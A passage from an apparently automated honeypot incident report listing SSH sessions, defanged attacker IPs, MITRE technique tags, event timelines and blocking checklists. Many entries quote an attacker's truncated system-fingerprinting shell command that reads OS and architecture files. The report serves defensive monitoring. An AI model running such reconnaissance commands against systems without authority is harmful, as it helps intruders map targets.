| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:23:21` | `cowrie.session.connect` |
| `2026-07-24 17:23:21` | `cowrie.client.version` |
| `2026-07-24 17:23:21` | `cowrie.client.kex` |
| `2026-07-24 17:23:22` | `cowrie.login.success` |
| `2026-07-24 17:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b023a13259ea

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:23 |
| **Last Seen** | 2026-07-24 17:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:23:45` | `cowrie.session.connect` |
| `2026-07-24 17:23:45` | `cowrie.client.version` |
| `2026-07-24 17:23:45` | `cowrie.client.kex` |
| `2026-07-24 17:23:48` | `cowrie.login.success` |
| `2026-07-24 17:23:50` | `cowrie.session.params` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.success` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:50` | `cowrie.command.input` |
| `2026-07-24 17:23:51` | `cowrie.log.closed` |
| `2026-07-24 17:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1e7ec1c948

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:25 |
| **Last Seen** | 2026-07-24 17:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:25:03` | `cowrie.session.connect` |
| `2026-07-24 17:25:04` | `cowrie.client.version` |
| `2026-07-24 17:25:04` | `cowrie.client.kex` |
| `2026-07-24 17:25:07` | `cowrie.login.success` |
| `2026-07-24 17:25:09` | `cowrie.session.params` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.success` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:09` | `cowrie.command.input` |
| `2026-07-24 17:25:10` | `cowrie.log.closed` |
| `2026-07-24 17:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ae9893162d4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:26 |
| **Last Seen** | 2026-07-24 17:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:26:21` | `cowrie.session.connect` |
| `2026-07-24 17:26:21` | `cowrie.client.version` |
| `2026-07-24 17:26:21` | `cowrie.client.kex` |
| `2026-07-24 17:26:24` | `cowrie.login.success` |
| `2026-07-24 17:26:26` | `cowrie.session.params` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.success` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.command.input` |
| `2026-07-24 17:26:26` | `cowrie.log.closed` |
| `2026-07-24 17:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5947fcf03826

| Field | Detail |
|---|---|
| **Source IP** | `218.13.214[.]18` |
| **First Seen** | 2026-07-24 17:26 |
| **Last Seen** | 2026-07-24 17:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:26:33` | `cowrie.session.connect` |
| `2026-07-24 17:26:34` | `cowrie.client.version` |
| `2026-07-24 17:26:34` | `cowrie.client.kex` |
| `2026-07-24 17:26:36` | `cowrie.login.success` |
| `2026-07-24 17:26:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.13.214[.]18` to AbuseIPDB if not already reported
- [ ] Block `218.13.214[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ea3ca88905

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-07-24 17:26 |
| **Last Seen** | 2026-07-24 17:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:26:42` | `cowrie.session.connect` |
| `2026-07-24 17:26:42` | `cowrie.client.version` |
| `2026-07-24 17:26:42` | `cowrie.client.kex` |
| `2026-07-24 17:26:44` | `cowrie.login.success` |
| `2026-07-24 17:26:44` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2210ad82641d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:27 |
| **Last Seen** | 2026-07-24 17:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:27:37` | `cowrie.session.connect` |
| `2026-07-24 17:27:37` | `cowrie.client.version` |
| `2026-07-24 17:27:37` | `cowrie.client.kex` |
| `2026-07-24 17:27:40` | `cowrie.login.success` |
| `2026-07-24 17:27:42` | `cowrie.session.params` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.success` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:42` | `cowrie.command.input` |
| `2026-07-24 17:27:43` | `cowrie.log.closed` |
| `2026-07-24 17:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659b17f543f2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:28 |
| **Last Seen** | 2026-07-24 17:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:28:55` | `cowrie.session.connect` |
| `2026-07-24 17:28:55` | `cowrie.client.version` |
| `2026-07-24 17:28:55` | `cowrie.client.kex` |
| `2026-07-24 17:28:58` | `cowrie.login.success` |
| `2026-07-24 17:29:00` | `cowrie.session.params` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.success` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:00` | `cowrie.command.input` |
| `2026-07-24 17:29:01` | `cowrie.log.closed` |
| `2026-07-24 17:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cce22fd9c0

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-24 17:29 |
| **Last Seen** | 2026-07-24 17:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:29:57` | `cowrie.session.connect` |
| `2026-07-24 17:29:58` | `cowrie.client.version` |
| `2026-07-24 17:29:58` | `cowrie.client.kex` |
| `2026-07-24 17:29:58` | `cowrie.login.success` |
| `2026-07-24 17:29:59` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a38cff5f2e65

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:30 |
| **Last Seen** | 2026-07-24 17:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:30:12` | `cowrie.session.connect` |
| `2026-07-24 17:30:13` | `cowrie.client.version` |
| `2026-07-24 17:30:13` | `cowrie.client.kex` |
| `2026-07-24 17:30:15` | `cowrie.login.success` |
| `2026-07-24 17:30:17` | `cowrie.session.params` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.success` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:17` | `cowrie.command.input` |
| `2026-07-24 17:30:18` | `cowrie.log.closed` |
| `2026-07-24 17:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7476feec36d0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:31 |
| **Last Seen** | 2026-07-24 17:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:31:30` | `cowrie.session.connect` |
| `2026-07-24 17:31:31` | `cowrie.client.version` |
| `2026-07-24 17:31:31` | `cowrie.client.kex` |
| `2026-07-24 17:31:33` | `cowrie.login.success` |
| `2026-07-24 17:31:35` | `cowrie.session.params` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.success` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:35` | `cowrie.command.input` |
| `2026-07-24 17:31:36` | `cowrie.log.closed` |
| `2026-07-24 17:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443fcb81a559

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:32 |
| **Last Seen** | 2026-07-24 17:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:32:47` | `cowrie.session.connect` |
| `2026-07-24 17:32:48` | `cowrie.client.version` |
| `2026-07-24 17:32:48` | `cowrie.client.kex` |
| `2026-07-24 17:32:51` | `cowrie.login.success` |
| `2026-07-24 17:32:52` | `cowrie.session.params` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.success` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:52` | `cowrie.command.input` |
| `2026-07-24 17:32:53` | `cowrie.log.closed` |
| `2026-07-24 17:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc68b97cd92

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:34 |
| **Last Seen** | 2026-07-24 17:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:34:04` | `cowrie.session.connect` |
| `2026-07-24 17:34:04` | `cowrie.client.version` |
| `2026-07-24 17:34:04` | `cowrie.client.kex` |
| `2026-07-24 17:34:07` | `cowrie.login.success` |
| `2026-07-24 17:34:09` | `cowrie.session.params` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.success` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:09` | `cowrie.command.input` |
| `2026-07-24 17:34:10` | `cowrie.log.closed` |
| `2026-07-24 17:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123d14026fb2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:35 |
| **Last Seen** | 2026-07-24 17:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:35:22` | `cowrie.session.connect` |
| `2026-07-24 17:35:22` | `cowrie.client.version` |
| `2026-07-24 17:35:22` | `cowrie.client.kex` |
| `2026-07-24 17:35:24` | `cowrie.login.success` |
| `2026-07-24 17:35:26` | `cowrie.session.params` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.success` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:26` | `cowrie.command.input` |
| `2026-07-24 17:35:27` | `cowrie.log.closed` |
| `2026-07-24 17:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e42d85b0d0d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:36 |
| **Last Seen** | 2026-07-24 17:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
